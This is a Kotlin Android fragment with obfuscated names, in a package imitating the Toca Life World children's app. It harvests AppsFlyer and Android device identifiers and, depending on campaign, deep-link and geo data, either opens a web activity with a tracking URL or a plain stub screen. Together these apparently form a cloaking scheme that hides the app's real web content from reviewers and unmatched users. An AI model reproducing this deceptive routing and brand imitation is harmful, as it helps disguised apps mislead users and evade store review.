package com.tocaboca.tocalifeworlda.itryrh
import org.koin.android.ext.android.inject
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.hchuxhuvhjicjjidssdji
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.fokdooskkojicxzjiv
import com.appsflyer.AppsFlyerLib
import org.koin.core.qualifier.named
import androidx.fragment.app.Fragment
import android.content.Context
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.tokrkoo
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.nvniciicjvcicjvcvhuhusd
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.eplwpwqlp
import android.view.ViewGroup
import android.content.Intent
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.wiwikskoaskoxkozci
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.hokkogkooockovjixcjids
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.splxlpzpcp
import android.view.LayoutInflater
import android.content.SharedPreferences
import android.os.Build
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.jnjicvijcv
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.fodospsplzoxk
import android.os.Bundle
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.owpwpspa
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.apqlpqlpplwlpwskodko
import android.view.View
import com.tocaboca.tocalifeworlda.R
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.mmckxkkmvijjiivhuchuf
import com.tocaboca.tocalifeworlda.jghgn.Loxiijxcuhycv
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.qplqlplpwlps

import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.gjiijfjikokocokxov
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.ijokkkods
import com.tocaboca.tocalifeworlda.jghgn.Lpwpwposkxjichuv.ijjixcshu
import com.tocaboca.tocalifeworlda.dxssdf.Uookowkosadx


class Jnxijchuudsfs : Fragment() {
    private lateinit var jivijcvuhcvhucvgydygsyg: Context
    val rokko: SharedPreferences by inject(named("SharedPreferences"))



    override fun onStart() {
        super.onStart()
        val fhfhfjdficjxijivxjihud = Intent(activity, Uookowkosadx::class.java)
        val oplqlpqpsokokxok = AppsFlyerLib.getInstance().getAppsFlyerUID(jivijcvuhcvhucvgydygsyg)

        val fhdgyhvhu = rokko.getString(splxlpzpcp, null)
        val jcuxhvjiijxcjixcvusdha = rokko.getString("appCamp", null)
        val eopwlq = rokko.getString("deepSt", null)
        val wowkokoskoakodjixzchuhu = rokko.getString("mainId", null)

        val bkgkoo = Intent(activity, Loxiijxcuhycv::class.java)
        val kofkokorkokoekoejisjiad = rokko.getString(jnjicvijcv, null)
        val hchcyxgvud: String? = rokko.getString(ijokkkods, null)
        val fffooooijvjciuhhuchuchuhuch = Build.VERSION.RELEASE
        rokko.edit().putString(owpwpspa, oplqlpqpsokokxok).apply()


        val nfjdfidfhudfu = rokko.getString(eplwpwqlp, null)
        val nbnnjjivcicvihu = "com.tocaboca.tocalifeworlda"
        val wpllpqlpqlplpspkoczji = rokko.getString(qplqlplpwlps, null)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val aplsokxokckozko = rokko.getString(gjiijfjikokocokxov, null)



        val kosokox = "$nfjdfidfhudfu$ijjixcshu$jcuxhvjiijxcjixcvusdha&$hchuxhuvhjicjjidssdji$oplqlpqpsokokxok&$wiwikskoaskoxkozci$wowkokoskoakodjixzchuhu&$nvniciicjvcicjvcvhuhusd$nbnnjjivcicvihu&$hokkogkooockovjixcjids$fffooooijvjciuhhuchuchuhuch&$fokdooskkojicxzjiv$mmckxkkmvijjiivhuchuf"
        val hcxhux = "$nfjdfidfhudfu$hchuxhuvhjicjjidssdji$fhdgyhvhu&$wiwikskoaskoxkozci$hchcyxgvud&$nvniciicjvcicjvcvhuhusd$nbnnjjivcicvihu&$hokkogkooockovjixcjids$fffooooijvjciuhhuchuchuhuch&$fokdooskkojicxzjiv$mmckxkkmvijjiivhuchuf"
        val wplqlpplqlpsokxcji = "$nfjdfidfhudfu$ijjixcshu$eopwlq&$hchuxhuvhjicjjidssdji$oplqlpqpsokokxok&$wiwikskoaskoxkozci$wowkokoskoakodjixzchuhu&$nvniciicjvcicjvcvhuhusd$nbnnjjivcicvihu&$hokkogkooockovjixcjids$fffooooijvjciuhhuchuchuhuch&$fokdooskkojicxzjiv$apqlpqlpplwlpwskodko"
        val mvckvocij = "$nfjdfidfhudfu$ijjixcshu$eopwlq&$hchuxhuvhjicjjidssdji$fhdgyhvhu&$wiwikskoaskoxkozci$hchcyxgvud&$nvniciicjvcicjvcvhuhusd$nbnnjjivcicvihu&$hokkogkooockovjixcjids$fffooooijvjciuhhuchuchuhuch&$fokdooskkojicxzjiv$apqlpqlpplwlpwskodko"

        when(wpllpqlpqlplpspkoczji) {
            "1" ->
                if(jcuxhvjiijxcjixcvusdha!!.contains(tokrkoo)) {
                    rokko.edit().putString(fodospsplzoxk, kosokox).apply()
                    rokko.edit().putString("WebInt", "campaign").apply()
                    startActivity(fhfhfjdficjxijivxjihud)
                    activity?.finish()
                } else if (eopwlq!=null||kofkokorkokoekoejisjiad!!.contains(aplsokxokckozko.toString())) {
                    rokko.edit().putString(fodospsplzoxk, wplqlpplqlpsokxcji).apply()
                    rokko.edit().putString("WebInt", "deepLink").apply()
                    startActivity(fhfhfjdficjxijivxjihud)
                    activity?.finish()
                } else {
                    startActivity(bkgkoo)
                    activity?.finish()
                }
            "0" ->
                if(eopwlq!=null) {
                    rokko.edit().putString(fodospsplzoxk, mvckvocij).apply()
                    rokko.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(fhfhfjdficjxijivxjihud)
                    activity?.finish()
                } else if (kofkokorkokoekoejisjiad!!.contains(aplsokxokckozko.toString())) {
                    rokko.edit().putString(fodospsplzoxk, hcxhux).apply()
                    rokko.edit().putString("WebInt", "geo").apply()
                    startActivity(fhfhfjdficjxijivxjihud)
                    activity?.finish()
                } else {
                    startActivity(bkgkoo)
                    activity?.finish()
                }
        }
    }
    override fun onAttach(context: Context) {
        super.onAttach(context)
        jivijcvuhcvhucvgydygsyg = context
    }


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.cjvuvygctfdjife, container, false)
    }






}
